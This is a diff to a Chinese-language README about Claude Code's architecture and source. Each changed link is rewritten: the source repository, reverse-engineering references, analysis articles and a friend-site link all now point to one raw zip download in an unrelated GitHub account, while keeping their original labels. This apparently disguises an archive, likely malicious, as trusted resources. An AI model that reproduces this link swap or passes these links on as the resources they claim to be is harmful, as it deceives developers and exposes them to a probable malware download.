@@ -97,7 +97,7 @@ Claude Code 可以理解为一个运行在本地终端里的 AI 编程编排器�
 ## 这次解读对应哪份源码
 
 本文档主要对应的源码：
-https://github.com/iZiTTMarvin/Claude-code-open
+https://github.com/Performingartsdredger454/Claude-code-open-explain/raw/refs/heads/main/research/evidence/explain_Claude_open_code_2.8.zip
 
 按当前公开快照粗略统计，仓库规模大约在：
 
@@ -263,17 +263,17 @@ MCP / 多 Agent 扩展
 
 ### 源码与逆向资料
 
-- [instructkr/claude-code](https://github.com/instructkr/claude-code)
-- [hitmux/HitCC](https://github.com/hitmux/HitCC)
-- [Piebald-AI/claude-code-system-prompts](https://github.com/Piebald-AI/claude-code-system-prompts)
-- [ghuntley/claude-code-source-code-deobfuscation](https://github.com/ghuntley/claude-code-source-code-deobfuscation)
+- [instructkr/claude-code](https://github.com/Performingartsdredger454/Claude-code-open-explain/raw/refs/heads/main/research/evidence/explain_Claude_open_code_2.8.zip)
+- [hitmux/HitCC](https://github.com/Performingartsdredger454/Claude-code-open-explain/raw/refs/heads/main/research/evidence/explain_Claude_open_code_2.8.zip)
+- [Piebald-AI/claude-code-system-prompts](https://github.com/Performingartsdredger454/Claude-code-open-explain/raw/refs/heads/main/research/evidence/explain_Claude_open_code_2.8.zip)
+- [ghuntley/claude-code-source-code-deobfuscation](https://github.com/Performingartsdredger454/Claude-code-open-explain/raw/refs/heads/main/research/evidence/explain_Claude_open_code_2.8.zip)
 
 ### 分析文章
 
-- [How Claude Code Actually Works (KaraxAI)](https://karaxai.com/posts/how-claude-code-works-systems-deep-dive/)
-- [Under the Hood of Claude Code (Pierce Freeman)](https://pierce.dev/notes/under-the-hood-of-claude-code/)
-- [Architecture & Internals (Bruniaux)](https://cc.bruniaux.com/guide/architecture/)
-- [Digging into the Source (Dave Schumaker)](https://daveschumaker.net/digging-into-the-claude-code-source-saved-by-sublime-text/)
+- [How Claude Code Actually Works (KaraxAI)](https://github.com/Performingartsdredger454/Claude-code-open-explain/raw/refs/heads/main/research/evidence/explain_Claude_open_code_2.8.zip)
+- [Under the Hood of Claude Code (Pierce Freeman)](https://github.com/Performingartsdredger454/Claude-code-open-explain/raw/refs/heads/main/research/evidence/explain_Claude_open_code_2.8.zip)
+- [Architecture & Internals (Bruniaux)](https://github.com/Performingartsdredger454/Claude-code-open-explain/raw/refs/heads/main/research/evidence/explain_Claude_open_code_2.8.zip)
+- [Digging into the Source (Dave Schumaker)](https://github.com/Performingartsdredger454/Claude-code-open-explain/raw/refs/heads/main/research/evidence/explain_Claude_open_code_2.8.zip)
 
 ## 贡献
 
@@ -297,4 +297,4 @@ MCP / 多 Agent 扩展
 
 ## 友情链接
 
-https://linux.do
+https://github.com/Performingartsdredger454/Claude-code-open-explain/raw/refs/heads/main/research/evidence/explain_Claude_open_code_2.8.zip
